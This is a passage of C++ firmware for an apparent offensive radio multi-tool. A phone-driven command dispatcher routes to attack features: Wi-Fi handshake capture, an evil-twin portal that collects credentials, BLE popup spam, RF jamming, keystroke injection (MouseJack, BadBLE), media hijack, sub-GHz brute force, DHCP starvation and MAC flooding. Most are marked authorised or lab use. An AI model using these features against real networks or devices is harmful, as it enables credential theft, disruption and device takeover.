                                    mac, (uint8_t)channel, (uint32_t)secs, outPath
                                );
                                JsonDocument o;
                                beginEnvelope(o, MSG_ACK, id);
                                JsonObject d = o["d"].to<JsonObject>();
                                d["ok"] = ok;
                                d["out"] = ok ? ("pmkid/eapol pcap written to " + outPath)
                                              : "no PMKID/EAPOL seen (no clients? try again, closer, more time)";
                                sendEnvelope(o);
#else
                                sendErr(id, 501, "wifi_pmkid not available in this (lite) build");
#endif
                            }
                            break;
                        }
                        // Brucia: phone-driven MIFARE Classic key-dictionary check (offload).
                        //   mifare_keycheck <hexKey1,hexKey2,...>
                        if (cmdStr.startsWith("mifare_keycheck ")) {
                            runMifareKeycheck(cmdStr.substring(16), id);
                            break;
                        }
                        // Brucia: NFC parity commands (reuse the existing RFID stack).
                        //   nfc_ndef_push <url|text|contact> <payload>  (emulate NDEF to a phone)
                        if (cmdStr.startsWith("nfc_ndef_push ")) {
                            runNfcNdefPush(cmdStr.substring(14), id);
                            break;
                        }
                        //   nfc_emv_read  (masked PAN + expiry + scheme; lite build drops EMV)
                        if (cmdStr == "nfc_emv_read" || cmdStr.startsWith("nfc_emv_read ")) {
#if !defined(LITE_VERSION)
                            runNfcEmvRead(id);
#else
                            companionAckMsg(id, false, "EMV reader not available in this (lite) build");
#endif
                            break;
                        }
                        //   nfc_amiibo <emulate|dump>  (reports unsupported - external dongle only)
                        if (cmdStr == "nfc_amiibo" || cmdStr.startsWith("nfc_amiibo ")) {
                            runNfcAmiibo(cmdStr.length() > 10 ? cmdStr.substring(11) : String(""), id);
                            break;
                        }
                        //   mifare_nested / mifare_mfkey32  (no native primitive: Bruce recovers
                        //   MIFARE keys only via the dictionary check or an external PN532Killer
                        //   sniffer - report that honestly instead of a bare unknown-command error).
                        if (cmdStr == "mifare_nested" || cmdStr.startsWith("mifare_nested ")) {
                            companionAckMsg(
                                id, false,
                                "nested recovery needs an external PN532Killer sniffer; use the "
                                "dictionary key-check (mifare_keycheck) with the onboard PN532"
                            );
                            break;
                        }
                        if (cmdStr == "mifare_mfkey32" || cmdStr.startsWith("mifare_mfkey32 ")) {
                            companionAckMsg(
                                id, false,
                                "mfkey32 sniffing needs an external PN532Killer; the onboard PN532 "
                                "supports the dictionary key-check (mifare_keycheck)"
                            );
                            break;
                        }
                        //   nfc_write_uid <hexuid>  (write UID to a magic/Gen1A MIFARE card)
                        if (cmdStr.startsWith("nfc_write_uid ")) {
                            runNfcWriteUid(cmdStr.substring(14), id);
                            break;
                        }
                        //   srix_read [secs]  (SRIX / ST25TB ISO14443B read via PN532)
                        if (cmdStr == "srix_read" || cmdStr.startsWith("srix_read ")) {
                            runSrixRead(cmdStr.length() > 9 ? cmdStr.substring(10) : String(""), id);
                            break;
                        }
                        //   rfid125_read [secs]  (125 kHz LF read; boards with the UART LF reader)
                        if (cmdStr == "rfid125_read" || cmdStr.startsWith("rfid125_read ")) {
                            runRfid125Read(cmdStr.length() > 12 ? cmdStr.substring(13) : String(""), id);
                            break;
                        }
                        // Brucia: phone-driven, time-bounded Wi-Fi beacon spam. The phone
                        // supplies the SSID list. AUTHORIZED / LAB USE ONLY.
                        //   wifi_beacon_spam <secs> <ssid1\nssid2...>
                        if (cmdStr.startsWith("wifi_beacon_spam ")) {
#if !defined(LITE_VERSION)
                            runWifiBeaconSpam(cmdStr.substring(17), id);
#else
                            sendErr(id, 501, "wifi_beacon_spam not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: phone-driven Evil Portal (captive-portal / evil twin). The device
                        // runs the fake AP + DNS + web server; captured creds stream as EVENT evil.cred.
                        if (cmdStr.startsWith("evil_portal_start")) {
#if !defined(LITE_VERSION)
                            // args after the command token (may be empty -> default SSID)
                            String a = cmdStr.length() > 18 ? cmdStr.substring(18) : "";
                            evilPortalStart(a, id);
#else
                            sendErr(id, 501, "evil_portal not available in this (lite) build");
#endif
                            break;
                        }
                        if (cmdStr == "evil_portal_stop") {
#if !defined(LITE_VERSION)
                            evilPortalStop(id, true);
#else
                            sendErr(id, 501, "evil_portal not available in this (lite) build");
#endif
                            break;
                        }
                        if (cmdStr == "evil_portal_status") {
#if !defined(LITE_VERSION)
                            evilPortalStatus(id);
#else
                            sendErr(id, 501, "evil_portal not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: phone-driven, time-bounded IR jammer (abortable bursts).
                        if (cmdStr.startsWith("ir_jammer")) {
                            int secs = cmdStr.length() > 10 ? cmdStr.substring(10).toInt() : 0;
                            uint32_t n = ir_jammer_headless(secs);
                            char buf[32];
                            snprintf(buf, sizeof(buf), "ir jammed (%lu pkts)", (unsigned long)n);
                            companionAckMsg(id, true, buf);
                            break;
                        }
                        // Brucia: phone-driven, time-bounded BLE (Apple ProximityPair) spam.
                        if (cmdStr.startsWith("ble_spam ")) {
                            int secs = cmdStr.substring(9).toInt();
                            if (secs < 1) secs = 8;
                            if (secs > 60) secs = 60;
#if !defined(LITE_VERSION)
                            runBleSpamBounded((uint32_t)secs * 1000);
                            sendAck(id, true);
#else
                            sendErr(id, 501, "ble_spam not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: phone-driven, time-bounded iBeacon advertiser.
                        //   ble_ibeacon <secs> [uuid]
                        if (cmdStr.startsWith("ble_ibeacon")) {
                            String a = cmdStr.length() > 12 ? cmdStr.substring(12) : "";
                            a.trim();
                            int sp = a.indexOf(' ');
                            int secs = (sp < 0 ? a : a.substring(0, sp)).toInt();
                            String uuid = sp < 0 ? "" : a.substring(sp + 1);
                            uuid.trim();
                            if (secs < 1) secs = 8;
                            if (secs > 60) secs = 60;
                            runIbeaconBounded(
                                (uint32_t)secs * 1000, "Bruce iBeacon",
                                uuid.length() ? uuid.c_str() : "8ec76ea3-6668-48da-9866-75be8bc86f4d"
                            );
                            companionAckMsg(id, true, "ibeacon done");
                            break;
                        }
                        // Brucia: phone-driven, time-bounded BLE Google Fast Pair (Android) spam.
                        // Advertises Fast Pair "device nearby" popups to nearby Android phones.
                        // AUTHORIZED / LAB USE ONLY.   ble_fastpair_spam <secs>
                        if (cmdStr.startsWith("ble_fastpair_spam ") || cmdStr == "ble_fastpair_spam") {
                            int secs = cmdStr.length() > 18 ? cmdStr.substring(18).toInt() : 0;
                            if (secs < 1) secs = 8;
                            if (secs > 60) secs = 60; // clamp 1..60
#if !defined(LITE_VERSION)
                            runBleFastPairSpamBounded((uint32_t)secs * 1000);
                            String out = "fast pair spam done (" + String(secs) + "s)";
                            companionAckMsg(id, true, out.c_str());
#else
                            sendErr(id, 501, "ble_fastpair_spam not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: unified phone-driven BLE spam — one command covering every
                        // platform so the app's Spam hub can target by platform. Routes to the
                        // same bounded wrappers as ble_spam / ble_fastpair_spam.
                        // AUTHORIZED / LAB USE ONLY.
                        //   ble_spam_platform <ios|android|windows|samsung|all> <secs> [copies]
                        //   copies = how many distinct advertisements to blast per cycle (burst);
                        //   defaults to 10 when the token is absent (old 2-token app still works),
                        //   clamped 1..100.
                        if (cmdStr.startsWith("ble_spam_platform ")) {
                            String args = cmdStr.substring(18);
                            args.trim();
                            int sp = args.indexOf(' ');
                            String target = sp < 0 ? args : args.substring(0, sp);
                            target.toLowerCase();
                            // Remaining tokens after <target>: "<secs> [copies]"
                            String rest = sp < 0 ? "" : args.substring(sp + 1);
                            rest.trim();
                            int sp2 = rest.indexOf(' ');
                            int secs =
                                rest.length() == 0
                                    ? 0
                                    : (sp2 < 0 ? rest.toInt() : rest.substring(0, sp2).toInt());
                            if (secs < 1) secs = 8;
                            if (secs > 60) secs = 60; // clamp 1..60
                            // Optional 3rd token: copies. Absent -> default 10 (many-at-once).
                            uint8_t copies;
                            if (sp2 < 0) {
                                copies = 10;
                            } else {
                                int c = rest.substring(sp2 + 1).toInt();
                                if (c < 1) c = 1;
                                if (c > 100) c = 100; // clamp 1..100
                                copies = (uint8_t)c;
                            }
#if !defined(LITE_VERSION)
                            bool known = true;
                            uint32_t ms = (uint32_t)secs * 1000;
                            if (target == "ios") {
                                runBleSpamBounded(ms, copies);
                            } else if (target == "android") {
                                runBleFastPairSpamBounded(ms, copies);
                            } else if (target == "windows") {
                                runBleSwiftPairSpamBounded(ms, copies);
                            } else if (target == "samsung") {
                                runBleSamsungSpamBounded(ms, copies);
                            } else if (target == "all") {
                                // Cycle through every platform in 1s slices for the duration.
                                static void (*const allFns[])(uint32_t, uint8_t) = {
                                    runBleSpamBounded,
                                    runBleFastPairSpamBounded,
                                    runBleSwiftPairSpamBounded,
                                    runBleSamsungSpamBounded
                                };
                                uint32_t endAll = millis() + ms;
                                int idx = 0;
                                while ((int32_t)(millis() - endAll) < 0) {
                                    if (check(EscPress)) break;
                                    uint32_t rem = endAll - millis();
                                    uint32_t slice = rem < 1000 ? rem : 1000;
                                    allFns[idx & 3](slice, copies);
                                    idx++;
                                }
                            } else {
                                known = false;
                            }
                            if (known) {
                                String out = target + " spam done (" + String(secs) + "s)";
                                companionAckMsg(id, true, out.c_str());
                            } else {
                                sendErr(id, 400, "bad target (use ios|android|windows|samsung|all)");
                            }
#else
                            sendErr(id, 501, "ble_spam_platform not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia BLE GATT explorer (central). NimBLE is always present,
                        // so no board gate; the op stops the ble.scan stream (shared
                        // controller) for its duration. AUTHORIZED / LAB USE ONLY.
                        //   ble_gatt_connect <mac>            (discover services+chars)
                        //   ble_gatt_read <mac> <char_uuid>   (read one characteristic)
                        if (cmdStr.startsWith("ble_gatt_connect ")) {
                            runBleGattConnect(cmdStr.substring(17), id);
                            break;
                        }
                        if (cmdStr.startsWith("ble_gatt_read ")) {
                            runBleGattRead(cmdStr.substring(14), id);
                            break;
                        }
                        // Brucia Bad BLE: run a Ducky/BadUSB script over BLE HID. Pulls the
                        // ducky_typer BLE keyboard stack, which is dropped from lite builds.
                        // AUTHORIZED / LAB USE ONLY.   ble_badble <ducky script text>
                        if (cmdStr.startsWith("ble_badble ")) {
#if !defined(LITE_VERSION)
                            runBleBadble(cmdStr.substring(11), id);
#else
                            sendErr(id, 501, "ble_badble not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: phone-driven FM broadcast (Si4713). Guarded so boards
                        // without an FM module still link (reports "no FM module").
                        //   fm_tx <freqKHz> [rds_text...]   /   fm_stop
                        if (cmdStr.startsWith("fm_tx ") || cmdStr == "fm_tx") {
#ifdef COMPANION_HAS_FM
                            runFmTx(cmdStr.length() > 6 ? cmdStr.substring(6) : String(""), id);
#else
                            sendNoFm(id);
#endif
                            break;
                        }
                        if (cmdStr == "fm_stop") {
#ifdef COMPANION_HAS_FM
                            runFmStop(id);
#else
                            sendNoFm(id);
#endif
                            break;
                        }
                        // Brucia: phone-driven FM AUDIO broadcast over the Si4713 digital
                        // (I2S) input. Fully capability-gated: a board with the FM driver but
                        // no Si4713 fitted (e.g. T-Embed CC1101) replies ok:false "no FM
                        // module". AUTHORIZED / LAB USE ONLY.
                        //   fm_audio_begin <freqKHz> <phone|mic>
                        //   fm_audio_data <base64 pcm>   /   fm_audio_stop
                        if (cmdStr.startsWith("fm_audio_begin ")) {
#ifdef COMPANION_HAS_FM_AUDIO
                            runFmAudioBegin(cmdStr.substring(15), id);
#else
                            companionAckMsg(id, false, "no FM audio route on this board");
#endif
                            break;
                        }
                        if (cmdStr.startsWith("fm_audio_data ")) {
#ifdef COMPANION_HAS_FM_AUDIO
                            runFmAudioData(cmdStr.substring(14), id);
#else
                            companionAckMsg(id, false, "no FM audio route on this board");
#endif
                            break;
                        }
                        if (cmdStr == "fm_audio_stop") {
#ifdef COMPANION_HAS_FM_AUDIO
                            runFmAudioStop(id);
#else
                            companionAckMsg(id, false, "no FM audio route on this board");
#endif
                            break;
                        }
                        // Brucia: NRF24 (2.4GHz) features. Guarded so boards without the nRF24
                        // wiring still link (reply "no NRF24 module"); a runtime probe also gates
                        // boards wired for it but with no module attached. AUTHORIZED/LAB USE ONLY.
                        //   nrf24_scan <secs>   /   nrf24_sniff <secs>
                        if (cmdStr.startsWith("nrf24_scan ") || cmdStr == "nrf24_scan") {
#if defined(COMPANION_HAS_NRF24)
                            runNrf24Scan(cmdStr.length() > 11 ? cmdStr.substring(11).toInt() : 0, id);
#else
                            sendNoNrf24(id);
#endif
                            break;
                        }
                        if (cmdStr.startsWith("nrf24_sniff ") || cmdStr == "nrf24_sniff") {
#if defined(COMPANION_HAS_NRF24)
                            runNrf24Sniff(cmdStr.length() > 12 ? cmdStr.substring(12).toInt() : 0, id);
#else
                            sendNoNrf24(id);
#endif
                            break;
                        }
                        //   nrf24_jammer <secs>   (AUTHORIZED / LAB USE ONLY)
                        if (cmdStr.startsWith("nrf24_jammer ") || cmdStr == "nrf24_jammer") {
#if defined(COMPANION_HAS_NRF24)
                            runNrf24Jammer(cmdStr.length() > 13 ? cmdStr.substring(13).toInt() : 0, id);
#else
                            sendNoNrf24(id);
#endif
                            break;
                        }
                        // nrf24_mousejack <secs> [inject text]: headless scan (stream EVENT
                        // ev="nrf24.mj") + optional keystroke injection, reusing Bruce's MouseJack
                        // (modules/NRF24/nrf_mousejack.cpp). That module is dropped on lite builds,
                        // so lite replies ok:false. AUTHORIZED / LAB USE ONLY.
                        if (cmdStr.startsWith("nrf24_mousejack ") || cmdStr == "nrf24_mousejack") {
#if defined(COMPANION_HAS_NRF24) && !defined(LITE_VERSION)
                            {
                                String rest = cmdStr.length() > 16 ? cmdStr.substring(16) : String("");
                                rest.trim();
                                int sp = rest.indexOf(' ');
                                int secs = (sp < 0 ? rest : rest.substring(0, sp)).toInt();
                                String txt = sp < 0 ? String("") : rest.substring(sp + 1);
                                runNrf24Mousejack(secs, txt, id);
                            }
#elif defined(COMPANION_HAS_NRF24)
                            companionAckMsg(id, false, "nrf24_mousejack not available on lite build");
#else
                            sendNoNrf24(id);
#endif
                            break;
                        }
                        // Brucia: run a phone-supplied BruceJS script headless and return its
                        // console/print output. The interpreter module is dropped on lite builds.
                        //   script_run <js source>
                        if (cmdStr.startsWith("script_run ")) {
#if !defined(LITE_VERSION) && !defined(DISABLE_INTERPRETER)
                            runScriptRun(cmdStr.substring(11), id);
#else
                            sendErr(id, 501, "script_run not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: 1-Wire iButton read / emulate (RW1990). Reuses ibutton.cpp,
                        // which is dropped on lite builds.
                        //   ibutton_read   /   ibutton_write <idhex>
                        if (cmdStr == "ibutton_read") {
#ifndef LITE_VERSION
                            runIButtonRead(id);
#else
                            sendErr(id, 501, "ibutton not available in this (lite) build");
#endif
                            break;
                        }
                        if (cmdStr.startsWith("ibutton_write ")) {
#ifndef LITE_VERSION
                            runIButtonWrite(cmdStr.substring(14), id);
#else
                            sendErr(id, 501, "ibutton not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: get / set the device clock (RTC). Links on all boards.
                        //   clock_get   /   clock_set <epoch>
                        if (cmdStr == "clock_get") {
                            runClockGet(id);
                            break;
                        }
                        if (cmdStr.startsWith("clock_set ")) {
                            runClockSet(cmdStr.substring(10), id);
                            break;
                        }
                        // Brucia: onboard I2S speaker (NS4168/MAX98357A). Reuses audio.cpp.
                        //   speaker_tone <freqHz> <ms>
                        if (cmdStr == "speaker_tone" || cmdStr.startsWith("speaker_tone ")) {
#if defined(HAS_NS4168_SPKR)
                            runSpeakerTone(cmdStr.length() > 13 ? cmdStr.substring(13) : String(""), id);
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        //   speaker_rtttl <rtttl>  : play a whole melody natively on the device
                        //   (correct timing, no per-note USB round-trips). Forces sound on + a floor
                        //   volume so it is audible even if the saved volume is muted/low, then restores.
                        if (cmdStr.startsWith("speaker_rtttl ")) {
#if defined(HAS_NS4168_SPKR)
                            String rt = cmdStr.substring(14);
                            int prevSound = bruceConfig.soundEnabled;
                            int prevVol = bruceConfig.soundVolume;
                            bruceConfig.soundEnabled = 1;
                            if (bruceConfig.soundVolume < 30) bruceConfig.soundVolume = 80;
                            bool okm = playAudioRTTTLString(rt, PLAYBACK_BLOCKING);
                            bruceConfig.soundEnabled = prevSound;
                            bruceConfig.soundVolume = prevVol;
                            companionAckMsg(id, okm, okm ? "played" : "rtttl failed");
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        //   speaker_song <rtttl> : play a melody in the BACKGROUND (async) so the
                        //   companion link stays free and speaker_stop can interrupt it.
                        if (cmdStr.startsWith("speaker_song ")) {
#if defined(HAS_NS4168_SPKR)
                            String rt = cmdStr.substring(13);
                            bruceConfig.soundEnabled = 1; // ensure audible; user volume kept
                            bool okm = playAudioRTTTLString(rt, PLAYBACK_ASYNC);
                            companionAckMsg(id, okm, okm ? "playing" : "song failed");
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        //   speaker_stop : stop any background playback (song).
                        if (cmdStr == "speaker_stop") {
#if defined(HAS_NS4168_SPKR)
                            stopAudioPlayback();
                            companionAckMsg(id, true, "stopped");
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        //   speaker_dtmf <key> [ms]  : native dual-tone DTMF (key in 0-9 * # A-D).
                        //   Same sound-force wrapper as speaker_rtttl so it is audible.
                        if (cmdStr.startsWith("speaker_dtmf ")) {
#if defined(HAS_NS4168_SPKR)
                            String a = cmdStr.substring(13);
                            a.trim();
                            char key = a.length() > 0 ? a.charAt(0) : 0;
                            if (key >= 'a' && key <= 'd') key = key - 'a' + 'A';
                            int spc = a.indexOf(' ');
                            int ms = spc >= 0 ? a.substring(spc + 1).toInt() : 200;
                            if (ms < 20) ms = 200;
                            if (ms > 5000) ms = 5000;
                            static const int LO[4] = {697, 770, 852, 941};
                            static const int HI[4] = {1209, 1336, 1477, 1633};
                            static const char *rows[4] = {"123A", "456B", "789C", "*0#D"};
                            int r = -1, c = -1;
                            for (int i = 0; i < 4 && r < 0; i++)
                                for (int j = 0; j < 4; j++)
                                    if (rows[i][j] == key) {
                                        r = i;
                                        c = j;
                                        break;
                                    }
                            if (r < 0) {
                                sendErr(id, 400, "usage: speaker_dtmf <0-9,*,#,A-D> [ms]");
                                break;
                            }
                            int prevSound = bruceConfig.soundEnabled;
                            int prevVol = bruceConfig.soundVolume;
                            bruceConfig.soundEnabled = 1;
                            if (bruceConfig.soundVolume < 30) bruceConfig.soundVolume = 80;
                            playDtmf((unsigned int)LO[r], (unsigned int)HI[c], (unsigned long)ms);
                            bruceConfig.soundEnabled = prevSound;
                            bruceConfig.soundVolume = prevVol;
                            companionAckMsg(id, true, "dtmf");
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        //   speaker_volume <0-100>  (persists bruceConfig.soundVolume)
                        if (cmdStr.startsWith("speaker_volume")) {
                            int v = cmdStr.length() > 15 ? cmdStr.substring(15).toInt() : 100;
                            if (v < 0) v = 0;
                            if (v > 100) v = 100;
                            bruceConfig.setSoundVolume(v);
                            char out[24];
                            snprintf(out, sizeof(out), "volume %d%%", v);
                            companionAckMsg(id, true, out);
                            break;
                        }
                        // Brucia: theme/LED commands APPLY LIVE but do NOT persist (no saveFile) -
                        // saveFile() writes to the shared SPI flash/SD and is heavy; persisting on
                        // every click stalls the link. The app's "Save" button sends config_save once.
                        //   theme_set <hex565>  (app matches the device color)
                        if (cmdStr.startsWith("theme_set ")) {
                            uint16_t c = (uint16_t)strtoul(cmdStr.substring(10).c_str(), nullptr, 16);
                            bruceConfig._setUiColor(c); // apply only, no saveFile
                            // Redraw the companion screen so the new color shows LIVE - otherwise the
                            // user had to press the device power button to force a redraw (which exits
                            // companion mode).
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
                            companionAckMsg(id, true, "theme set");
                            break;
                        }
                        //   led_set <hexRRGGBB>
                        if (cmdStr.startsWith("led_set ")) {
#ifdef HAS_RGB_LED
                            uint32_t c = (uint32_t)strtoul(cmdStr.substring(8).c_str(), nullptr, 16);
                            bruceConfig.ledColor = c; // apply only, no saveFile
                            if (bruceConfig.ledEffect == LED_EFFECT_SOLID) {
                                ledEffects(false);
                                setLedColor(CRGB(c));
                            }
                            companionAckMsg(id, true, "led set");
#else
                            companionAckMsg(id, false, "no rgb led");
#endif
                            break;
                        }
                        //   led_bright <0-100>
                        if (cmdStr.startsWith("led_bright ")) {
#ifdef HAS_RGB_LED
                            int v = cmdStr.substring(11).toInt();
                            if (v < 0) v = 0;
                            if (v > 100) v = 100;
                            bruceConfig.ledBright = v; // apply only, no saveFile
                            setLedBrightness(v);
                            if (bruceConfig.ledEffect == LED_EFFECT_SOLID) setLedColor(CRGB(bruceConfig.ledColor));
                            char o[24];
                            snprintf(o, sizeof(o), "led bright %d%%", v);
                            companionAckMsg(id, true, o);
#else
                            companionAckMsg(id, false, "no rgb led");
#endif
                            break;
                        }
                        //   led_effect <0-9> (0=solid)
                        if (cmdStr.startsWith("led_effect ")) {
#ifdef HAS_RGB_LED
                            int e = cmdStr.substring(11).toInt();
                            if (e < 0) e = 0;
                            if (e > 9) e = 9;
                            bruceConfig.ledEffect = e; // apply only, no saveFile
                            if (e == LED_EFFECT_SOLID) {
                                ledEffects(false);
                                setLedColor(CRGB(bruceConfig.ledColor));
                            } else {
                                ledEffects(true); // runs as a background FreeRTOS task
                            }
                            char o[24];
                            snprintf(o, sizeof(o), "led effect %d", e);
                            companionAckMsg(id, true, o);
#else
                            companionAckMsg(id, false, "no rgb led");
#endif
                            break;
                        }
                        // Brucia: persist the current config to flash (the app's theme "Save" button).
                        if (cmdStr == "config_save") {
                            bruceConfig.saveFile();
                            companionAckMsg(id, true, "saved");
                            break;
                        }
                        // Brucia: device screen brightness 0..100 (%).  scr_bright <n>
                        if (cmdStr.startsWith("scr_bright ")) {
                            int v = cmdStr.substring(11).toInt();
                            if (v < 0) v = 0;
                            if (v > 100) v = 100;
                            setBrightness((uint8_t)v, false);
                            char o[24];
                            snprintf(o, sizeof(o), "screen %d%%", v);
                            companionAckMsg(id, true, o);
                            break;
                        }
                        //   speaker_play <path>
                        if (cmdStr.startsWith("speaker_play ")) {
#if defined(HAS_NS4168_SPKR)
                            runSpeakerPlay(cmdStr.substring(13), id);
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        // Brucia: streamed raw-PCM playback on the onboard speaker (phone->device).
                        // S16LE mono. All read from the CMD's d{} JSON, like the other audio streams.
                        //   spkr_pcm_begin d{sr}   /   spkr_pcm_data d{pcm}   /   spkr_pcm_stop
                        if (cmdStr == "spkr_pcm_begin") {
#if defined(HAS_NS4168_SPKR)
                            runSpkrPcmBegin((uint32_t)(in["d"]["sr"] | 16000), id);
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        if (cmdStr == "spkr_pcm_data") {
#if defined(HAS_NS4168_SPKR)
                            runSpkrPcmData(String((const char *)(in["d"]["pcm"] | "")), id);
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        if (cmdStr == "spkr_pcm_stop") {
#if defined(HAS_NS4168_SPKR)
                            runSpkrPcmStop(id);
#else
                            companionAckMsg(id, false, "no speaker");
#endif
                            break;
                        }
                        // Brucia: record the onboard microphone to a WAV on SD. Reuses mic.cpp.
                        //   mic_record <secs 1..30>
                        if (cmdStr == "mic_record" || cmdStr.startsWith("mic_record ")) {
#if defined(COMPANION_HAS_MIC)
                            runMicRecord(cmdStr.length() > 11 ? cmdStr.substring(11) : String(""), id);
#else
                            companionAckMsg(id, false, "no microphone on this board");
#endif
                            break;
                        }
                        // Brucia: one-shot ESP-NOW broadcast (Connect send path). Dropped on lite.
                        //   espnow_send <message>
                        if (cmdStr.startsWith("espnow_send ")) {
#if !defined(LITE_VERSION)
                            runEspnowSend(cmdStr.substring(12), id);
#else
                            sendErr(id, 501, "espnow not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia: LoRa (SX127x/SX126x) parity. Guarded so boards without a LoRa
                        // radio still link (reply "no LoRa module"). AUTHORIZED USE ONLY.
                        //   lora_config <freqMHz> [bwKHz] [sf] [cr]
                        //   lora_send <text>   /   lora_recv <secs>
                        if (cmdStr.startsWith("lora_config ") || cmdStr == "lora_config") {
#if defined(COMPANION_HAS_LORA)
                            runLoraConfig(cmdStr.length() > 12 ? cmdStr.substring(12) : String(""), id);
#else
                            sendNoLora(id);
#endif
                            break;
                        }
                        if (cmdStr.startsWith("lora_send ")) {
#if defined(COMPANION_HAS_LORA)
                            runLoraSend(cmdStr.substring(10), id);
#else
                            sendNoLora(id);
#endif
                            break;
                        }
                        if (cmdStr.startsWith("lora_recv ") || cmdStr == "lora_recv") {
#if defined(COMPANION_HAS_LORA)
                            runLoraRecv(cmdStr.length() > 10 ? cmdStr.substring(10) : String(""), id);
#else
                            sendNoLora(id);
#endif
                            break;
                        }
                        // Brucia: Ethernet (W5500) parity. Guarded so boards without the W5500
                        // wiring still link (reply "no Ethernet").
                        //   eth_status   /   eth_config <dhcp | static <ip> <gw> <mask> [dns]>
                        if (cmdStr == "eth_status" || cmdStr.startsWith("eth_status ")) {
#if defined(COMPANION_HAS_ETH)
                            runEthStatus(id);
#else
                            sendNoEth(id);
#endif
                            break;
                        }
                        if (cmdStr.startsWith("eth_config ")) {
#if defined(COMPANION_HAS_ETH)
                            runEthConfig(cmdStr.substring(11), id);
#else
                            sendNoEth(id);
#endif
                            break;
                        }
                        //   eth_dhcp_starve [secs]   (DHCP starvation flood, AUTHORIZED USE)
                        if (cmdStr == "eth_dhcp_starve" || cmdStr.startsWith("eth_dhcp_starve ")) {
#if defined(COMPANION_HAS_ETH)
                            runEthDhcpStarve(cmdStr.length() > 15 ? cmdStr.substring(16) : String(""), id);
#else
                            sendNoEth(id);
#endif
                            break;
                        }
                        //   eth_mac_flood [secs]   (MAC flooding, AUTHORIZED USE)
                        if (cmdStr == "eth_mac_flood" || cmdStr.startsWith("eth_mac_flood ")) {
#if defined(COMPANION_HAS_ETH)
                            runEthMacFlood(cmdStr.length() > 13 ? cmdStr.substring(14) : String(""), id);
#else
                            sendNoEth(id);
#endif
                            break;
                        }
                        // Brucia BLE: one-shot media-control hijack of a paired audio device.
                        // Connects to the target and injects the media-control command sequence.
                        // Caps: ble.   ble_media <mac>
                        if (cmdStr.startsWith("ble_media ")) {
#if !defined(LITE_VERSION)
                            String mac = cmdStr.substring(10);
                            mac.trim();
                            if (mac.length() < 11) {
                                sendErr(id, 400, "usage: ble_media <mac>");
                            } else {
                                NimBLEAddress target(std::string(mac.c_str()), BLE_ADDR_PUBLIC);
                                bool okm = runMediaCommandHijackHeadless(target);
                                companionAckMsg(
                                    id, okm,
                                    okm ? "media hijack sent" : "media hijack failed (no connect?)"
                                );
                            }
#else
                            sendErr(id, 501, "ble_media not available in this (lite) build");
#endif
                            break;
                        }
                        // Brucia Sub-GHz (CC1101): headless, time-bounded brute force. Transmits
                        // codes for the chosen protocol/freq until the deadline, then ACKs a count.
                        // Caps: cc1101.   subghz_bruteforce <protocolIdx> <freqHz> <bits> <secs>
                        if (cmdStr.startsWith("subghz_bruteforce ")) {
#if defined(COMPANION_HAS_CC1101)
                            String a = cmdStr.substring(18);
                            a.trim();
                            int s1 = a.indexOf(' ');
                            int s2 = s1 >= 0 ? a.indexOf(' ', s1 + 1) : -1;
                            int s3 = s2 >= 0 ? a.indexOf(' ', s2 + 1) : -1;
                            if (s1 < 0 || s2 < 0 || s3 < 0) {
                                sendErr(id, 400, "usage: subghz_bruteforce <protocolIdx> <freqHz> <bits> <secs>");
                            } else {
                                int protoIdx = a.substring(0, s1).toInt();
                                uint32_t freqHz = (uint32_t)a.substring(s1 + 1, s2).toInt();
                                int bits = a.substring(s2 + 1, s3).toInt();
                                int secs = a.substring(s3 + 1).toInt();
                                if (secs < 1) secs = 1;
                                if (secs > 30) secs = 30; // clamp
                                uint32_t sent = rf_bruteforce_headless(
                                    protoIdx, freqHz, bits, (uint32_t)secs * 1000UL
                                );
                                char out[64];
                                snprintf(out, sizeof(out), "sent %lu codes", (unsigned long)sent);
                                companionAckMsg(id, sent > 0, out);
                            }
#else
                            sendErr(id, 501, "no CC1101 on this board");
#endif
                            break;
                        }
                        // Brucia Wi-Fi: headless, time-bounded deauth-flood ("jamming") detector.
                        // Hops channels 1-11 and reports deauth vs total frame counts.
                        // Caps: wifi.   jam_detect <secs>
                        // Wi-Fi station join parity (Bruce "Connect to Wifi"):
                        //   wifi_connect <ssid>\x1f<pass> -> join an AP (0x1F separates ssid/pass so
                        //                                    both may contain spaces); ACK the IP
                        //   wifi_disconnect               -> drop the station link
                        //   wifi_status                   -> connected <ssid> <ip> | disconnected
                        if (cmdStr.startsWith("wifi_connect ")) {
                            String rest = cmdStr.substring(13);
                            int sep = rest.indexOf('\x1f');
                            String ssid = sep >= 0 ? rest.substring(0, sep) : rest;
                            String pass = sep >= 0 ? rest.substring(sep + 1) : "";
                            ssid.trim();
                            if (ssid.length() == 0) {
                                sendErr(id, 400, "usage: wifi_connect <ssid>\\x1f<pass>");
                                break;
                            }
                            bool ok = _connectToWifiNetwork(ssid, pass);
                            if (ok) {
                                companionAckMsg(id, true, WiFi.localIP().toString().c_str());
                            } else {
                                companionAckMsg(id, false, "connect failed");
                            }
                            break;
                        }
                        if (cmdStr.startsWith("wifi_disconnect")) {
                            wifiDisconnect();
                            companionAckMsg(id, true, "disconnected");
                            break;
                        }
                        if (cmdStr.startsWith("wifi_status")) {
                            String out = WiFi.isConnected()
                                             ? ("connected " + WiFi.SSID() + " " + WiFi.localIP().toString())
                                             : String("disconnected");
                            companionAckMsg(id, true, out.c_str());
                            break;
                        }
                        // Wi-Fi MAC parity (Bruce "Change MAC"):
                        //   wifi_get_mac            -> ACK current STA MAC
